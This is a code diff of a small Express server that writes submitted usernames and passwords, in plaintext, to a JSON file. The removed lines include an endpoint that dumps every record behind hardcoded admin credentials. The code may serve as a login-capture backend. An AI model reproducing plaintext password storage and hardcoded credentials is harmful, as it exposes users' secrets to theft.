@@ -1,77 +1,43 @@
 const express = require("express");
-const bodyParser = require("body-parser");
 const fs = require("fs");
 const path = require("path");
 
 const app = express();
-const PORT = process.env.PORT || 3000;  // Use environment port or 3000 locally
+const PORT = process.env.PORT || 3000;
 
+app.use(express.urlencoded({ extended: true }));
+app.use(express.json());
 app.use(express.static("public"));
-app.use(bodyParser.urlencoded({ extended: true }));
-app.use(bodyParser.json());
 
 const DATA_FILE = path.join(__dirname, "savedUsers.json");
 
-// Ensure the file exists on server startup
+// Create savedUsers.json if it doesn't exist
 if (!fs.existsSync(DATA_FILE)) {
-  fs.writeFileSync(DATA_FILE, "[]", "utf-8");
+  fs.writeFileSync(DATA_FILE, "[]");
 }
 
-// Serve index.html on root route
-app.get("/", (req, res) => {
-  res.sendFile(path.join(__dirname, "public", "index.html"));
-});
-
-// Read users from file
-function readUsers() {
-  const data = fs.readFileSync(DATA_FILE, "utf-8");
-  return JSON.parse(data);
-}
-
-// Save users to file
-function saveUsers(users) {
-  fs.writeFileSync(DATA_FILE, JSON.stringify(users, null, 2), "utf-8");
-}
-
-// Save login info (handles username and password from form)
 app.post("/save", (req, res) => {
-  const { username, phone, email, password } = req.body;
+  try {
+    const { username, password } = req.body;
+    if (!username || !password) {
+      return res.status(400).send("Missing username or password");
+    }
 
-  if (!username || !password) {
-    return res.status(400).send("Missing required fields: username and password");
-  }
+    let users = [];
+    const data = fs.readFileSync(DATA_FILE, "utf-8");
+    users = JSON.parse(data);
 
-  const users = readUsers();
+    users.push({ username, password, time: new Date().toISOString() });
+    fs.writeFileSync(DATA_FILE, JSON.stringify(users, null, 2));
 
-  const newUser = {
-    username,
-    phone: phone || "",
-    email: email || "",
-    password,
-    timestamp: new Date().toISOString(),
-  };
-
-  users.push(newUser);
-  saveUsers(users);
-  res.send("User information saved successfully!");
-});
-
-// View saved user data (with basic auth)
-app.get("/saved", (req, res) => {
-  const auth = req.headers.authorization || "";
-  const [user, pass] = Buffer.from(auth.split(" ")[1] || "", "base64")
-    .toString("ascii")
-    .split(":");
-
-  if (user === "admin" && pass === "admin123") {
-    const users = readUsers();
-    res.json(users);
-  } else {
-    res.set("WWW-Authenticate", 'Basic realm="Restricted Area"');
-    res.status(401).send("Authentication required");
+    res.send("Saved successfully!");
+  } catch (error) {
+    console.error("Error saving user:", error);
+    res.status(500).send("Internal Server Error");
   }
 });
 
 app.listen(PORT, () => {
-  console.log(`✅ Server running at http://localhost:${PORT}`);
+  console.log(`Server running on http://localhost:${PORT}`);
 });
+
